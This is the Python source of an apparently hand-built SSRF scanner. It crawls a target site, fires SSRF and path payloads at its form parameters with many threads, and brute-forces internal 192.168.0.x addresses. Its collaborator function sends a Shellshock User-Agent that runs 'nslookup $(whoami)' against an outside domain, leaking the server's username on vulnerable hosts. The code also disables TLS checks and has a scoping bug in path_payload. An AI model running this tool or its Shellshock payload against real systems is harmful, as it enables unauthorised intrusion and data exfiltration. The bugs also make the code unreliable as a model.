import concurrent.futures
import subprocess
import re
import time
import ipaddress
from urllib.parse import quote, urljoin, urlparse, parse_qs, urlunparse
import requests
import urllib3
from bs4 import BeautifulSoup
from colorama import Fore, Style
import shutil
import argparse
import json
import csv
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- START: New function added to match your request ---
def create_session(proxy=None, cookies=None):
    """Configure HTTP session with retries and headers
    - Sets up connection pooling and retry logic
    - Adds browser-like User-Agent header
    - Configures proxy if provided"""
    session = requests.Session()
    session.verify = False  # Disable SSL verification
    
    # Configure automatic retries for failed requests
    retries = Retry(total=3, backoff_factor=1,
                   status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))
    session.mount('http://', HTTPAdapter(max_retries=retries))

    # Set headers to mimic regular browser traffic
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept-Language': 'en-US,en;q=0.5',
    }

    # Add custom cookies if provided
    if cookies:
        cookie_dict = {}
        for cookie in cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookie_dict[name] = value
        session.cookies.update(cookie_dict)  # Using requests' proper cookie handling

    if proxy:  # Proxy configuration
        if not proxy.startswith(('http://', 'https://')):
            proxy = f'http://{proxy}'
        session.proxies = {'http': proxy, 'https': proxy}
    
    return session
# --- END: New function ---

def print_shapes():
    pattern = "━━━━━━━━━━━━━━━━━━━━━"
    terminal_width = shutil.get_terminal_size((80, 20)).columns
    repeats = (terminal_width // (len(pattern) + 1)) + 1  
    full_line = (pattern + "") * repeats
    print(f"{Fore.BLUE}{full_line[:terminal_width]}"+Style.RESET_ALL)

def print_header(title):
    header = f"{Fore.CYAN}{'=' * 60}\n{title.center(60)}\n{'=' * 60}{Style.RESET_ALL}"
    print(f"\n{header}\n")

def ssrf_post(url, payload, param, session=None, return_bool=False):
    params = {param: payload}
    s = session or requests
    try:
        r=s.get(url)
        r = s.post(url, data=params, verify=False, timeout=5)
    except requests.exceptions.RequestException:
        return False
    if "internal server error" not in r.text.lower() and "not found" not in r.text.lower() and "missing parameter" not in r.text.lower() and "invalid url" not in r.text.lower() and "invalid" not in r.text.lower() and "host must be" not in r.text.lower():
        if return_bool:
            return True
        print(Fore.GREEN + f"{Style.BRIGHT}The site is vulnerable to SSRF in {Fore.RED}{Style.BRIGHT}{url}{Fore.GREEN}{Style.BRIGHT} with this vulnerability :\n{Fore.RED}{Style.BRIGHT}{payload} "+f"{Fore.GREEN}{Style.BRIGHT}via "+Fore.RED+f"{Style.BRIGHT}{param} "+Fore.GREEN+f"{Style.BRIGHT}parameter"+Style.RESET_ALL) 
        return True
    return False

def load_payloads(filename):
    payloads = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):  
                payloads.append(line)
    return payloads

def fetch_content(url):
    try:
        return requests.get(url, verify=False, timeout=5).text
    except requests.exceptions.RequestException:
        return ""

extract_actions = lambda content: re.findall(r'action=["\'](.*?)["\']', content, re.IGNORECASE)
extract_values  = lambda content: re.findall(r'value=["\'](.*?)["\']', content, re.IGNORECASE)
extract_names   = lambda content: re.findall(r'name=["\'](.*?)["\']', content, re.IGNORECASE)

def extract_base_url(full_url):
    parsed = urlparse(full_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def filter_similar_urls(urls):
    unique, seen = [], set()
    for url in urls:
        base = urljoin(url, urlparse(url).path)
        if base not in seen:
            unique.append(url)
            seen.add(base)
    return unique

def is_valid_ip_with_port(ip_port):
    try:
        if ":" in ip_port and ip_port.count(".") == 3:  # IPv4:port
            ip, port = ip_port.split(":")
            if all(0 <= int(octet) <= 255 for octet in ip.split(".")) and (0 <= int(port) <= 65535):
                return True
        elif ip_port.startswith('['):  # IPv6:port
            ip, port = ip_port.rsplit("]:", 1)
            ip = ip.lstrip('[')
            ipaddress.IPv6Address(ip)
            return 0 <= int(port) <= 65535
    except Exception:
        return False
    return False

def path_payload(url, pay, param, payloads):
    payload = {param: pay}
    session = create_session(args.proxy if hasattr(args, 'proxy') else None, cookies=None)  # Use new session
    try:
        r = session.post(url, data=payload, verify=False, timeout=5)
    except requests.exceptions.RequestException as e:
        return
    if payloads in r.text.lower():
        print(Fore.GREEN + f"{Style.BRIGHT}The site is vulnerable to SSRF in {Fore.RED}{Style.BRIGHT}{url}{Fore.GREEN}{Style.BRIGHT} with this vulnerability :\n{Fore.RED}{Style.BRIGHT}{pay} "+f"{Fore.GREEN}{Style.BRIGHT}via "+Fore.RED+f"{Style.BRIGHT}{param} "+Fore.GREEN+f"{Style.BRIGHT}parameter"+Style.RESET_ALL)
        return

def send_with_referer(url, ref_payload):
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        orginal_request = requests.get(url, headers=headers, timeout=5)
        headers["Referer"] = ref_payload
        r = requests.get(url, headers=headers, timeout=5)
        if (r.status_code != orginal_request.status_code) or (len(r.text) != len(orginal_request.text)):
            print("The site is vulnerable to SSRF:", ref_payload)
    except requests.exceptions.RequestException:
        pass

def collaborator(target_url, collab_domain):
    shellshock = f"() {{ :; }}; /usr/bin/nslookup $(whoami).{collab_domain}"
    for x in range(1, 256):
        ip = f"192.168.0.{x}"
        headers = {"Referer": f"http://{ip}:8080", "User-Agent": shellshock}
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
        except requests.exceptions.RequestException as e:
            return

def url_encode(original_url):
    encoded = quote(original_url, safe="/")
    return re.sub(r"%([0-9A-F]{2})", lambda m: f"%{m.group(1).lower()}", encoded)

def extract_links(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        for a_tag in soup.find_all('a', href=True):
            full_link = urljoin(url, a_tag['href'])
            parsed_url = urlparse(full_link)
            query_params = parse_qs(parsed_url.query)
            if 'path' in query_params:
                clean_link = full_link.split('path=')[0] + 'path='
                links.add(clean_link)
        return links
    except requests.exceptions.RequestException as e:
        return set()

def process_payload(ip, i, target_url, payload, name):
    constructed_url = "http://" + ip[:10] + str(i) + ip[-5:]
    if ssrf_post(target_url, constructed_url + payload, name, return_bool=True):
        print(Fore.GREEN + f"{Style.BRIGHT}The site is vulnerable to SSRF in {Fore.RED}{Style.BRIGHT}{target_url}{Fore.GREEN}{Style.BRIGHT} with this With this vulnerability :\n{Fore.RED}{Style.BRIGHT}{constructed_url + payload} "+f"{Fore.GREEN}{Style.BRIGHT}via "+Fore.RED+f"{Style.BRIGHT}{name} "+Fore.GREEN+f"{Style.BRIGHT}parameter"+Style.RESET_ALL)

def save_to_json(data, filename):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

def save_to_csv(data, filename):
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["URL", "Payload", "Parameter"])
        for entry in data:
            writer.writerow(entry)

def main():
    parser = argparse.ArgumentParser(description="SSRF Scanner")
    parser.add_argument('-u', '--url', help="Single target URL")
    parser.add_argument('-l', '--url-list', help="List of URLs to scan")
    parser.add_argument('-o', '--output', choices=['json', 'csv'], help="Output format (json/csv)")
    parser.add_argument('-t', '--threads', type=int, help="Number of threads")
    parser.add_argument('-pay', '--payload-list', help="Custom payload list file")
    parser.add_argument('-path', '--path-payload-list', help="Custom path payload list file")
    parser.add_argument('-c', '--collaborator', help="Burp Collaborator domain")
    parser.add_argument("-p", "--proxy", help="Proxy server for traffic inspection (e.g., Burp Suite: 127.0.0.1:8080)")
    parser.add_argument("--cookies", help="Cookies to use in the session (optional)", default=None)
    args = parser.parse_args()

    # Default payload lists
    default_payload_list = "payload.txt"
    default_path_payload_list = "pathpayload.txt"

    payload_list = args.payload_list or default_payload_list
    path_payload_list = args.path_payload_list or default_path_payload_list

    ssrf_payloads = load_payloads(payload_list)
    path_payloads = load_payloads(path_payload_list)

    print_header("SSRF SCANNER STARTING")

    if args.url:
        base_url = args.url.strip().rstrip('/')
        print(Fore.MAGENTA + f"{Style.BRIGHT}▶ Enter target URL :{Style.RESET_ALL}")
        print(Fore.GREEN + f"{Style.BRIGHT}{base_url}{Style.RESET_ALL}")

        session = create_session(proxy=args.proxy, cookies=args.cookies)

        main_page_content = fetch_content(base_url)
        raw_links = set(re.findall(r'href=["\'](.*?)["\']', main_page_content))
        absolute_links = {urljoin(base_url, link) for link in raw_links}

        actions_list, value_fields_list, name_fields_list = [], [], []

        print_shapes()
        print(Fore.MAGENTA + f"{Style.BRIGHT}Links found and checked:" + Style.RESET_ALL)
        for link in absolute_links:
            print(Fore.GREEN + f"{Style.BRIGHT}{link}{Style.RESET_ALL}")
            page_content = fetch_content(link)
            actions_list.extend(extract_actions(page_content))
            value_fields_list.extend(extract_values(page_content))
            name_fields_list.extend(extract_names(page_content))

        result_links = filter_similar_urls(absolute_links)

        url_value = []
        for v in value_fields_list:
            base_v = extract_base_url(v)
            if base_v not in url_value:
                url_value.append(base_v)

        print_shapes()
        print(Fore.MAGENTA + f"{Style.BRIGHT}Request body parameters:{Style.RESET_ALL}")
        for name in name_fields_list:
            print(Fore.GREEN + f"{Style.BRIGHT}{name}{Style.RESET_ALL}")

        target_urls = [f"{base_url}{action}" for action in actions_list]
        print_shapes()
        print(Fore.MAGENTA + f"{Style.BRIGHT}Links that work with POST and GET methods:{Style.RESET_ALL}")
        for t in target_urls:
            print(Fore.GREEN + f"{Style.BRIGHT}{t}{Style.RESET_ALL}")

        ip_ports = [i.split("://")[-1] for i in url_value]
        print_shapes()
        print(Fore.MAGENTA + f"{Style.BRIGHT}Links with IP addresses:{Style.RESET_ALL}")
        for ip in ip_ports:
            print(Fore.GREEN + f"{Style.BRIGHT}{ip}{Style.RESET_ALL}")

        print_shapes()
        print(Fore.MAGENTA + f"{Style.BRIGHT}Sending payload with found IP addresses:{Style.RESET_ALL}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 50) as executor:
            for ip in ip_ports:
                if is_valid_ip_with_port(ip):
                    for i in range(1, 256):
                        for target in target_urls:
                            for payload in path_payloads:
                                for name in name_fields_list:
                                    executor.submit(process_payload, ip, i, target, payload, name)

        print_shapes()
        print(Fore.MAGENTA + f"{Style.BRIGHT}Sending payload with parameters found:{Style.RESET_ALL}")
        tasks = [(target, payload, name) for target in target_urls for payload in ssrf_payloads for name in name_fields_list]

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 20) as executor:
            futures = [executor.submit(ssrf_post, url, payload, name, session) for url, payload, name in tasks]
            concurrent.futures.wait(futures)

        print_shapes()
        print(Fore.MAGENTA + f"{Style.BRIGHT}Send path payload :{Style.RESET_ALL}")
        tar = []
        for k in result_links:
            p = extract_links(k)
            p_cleaned = [url.replace(base_url, "") for url in p]
            tar.extend(p_cleaned)

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 50) as executor:
            futures = []
            for target_url in target_urls:
                for payload in path_payloads:
                    for u in tar:
                        combined = u + payload
                        encoded_text = url_encode(combined)
                        for n in name_fields_list:
                            futures.append(executor.submit(path_payload, target_url, encoded_text, n, payload))
            concurrent.futures.wait(futures)

        if args.collaborator:
            collab_domain = args.collaborator.strip()
            print(Fore.MAGENTA + f"{Style.BRIGHT}Sending Burp Collaborator domain with payload in referer header:{Style.RESET_ALL}")
            for link in result_links:
                send_with_referer(link, "http://" + collab_domain)
            if input(f"{Fore.MAGENTA}{Style.BRIGHT}Do you want to do bruteforce attack with Collaborator domain:{Style.RESET_ALL} ").strip().lower() == "yes":
                with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 20) as executor:
                    futures = [executor.submit(collaborator, link, collab_domain) for link in result_links]
                    concurrent.futures.wait(futures)

        if args.output:
            output_data = [{"URL": link} for link in result_links]
            if args.output == "json":
                save_to_json(output_data, "results.json")
            elif args.output == "csv":
                save_to_csv(output_data, "results.csv")

    elif args.url_list:
        with open(args.url_list, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
            for url in urls:
                args.url = url
                main()

if __name__ == "__main__":
    main()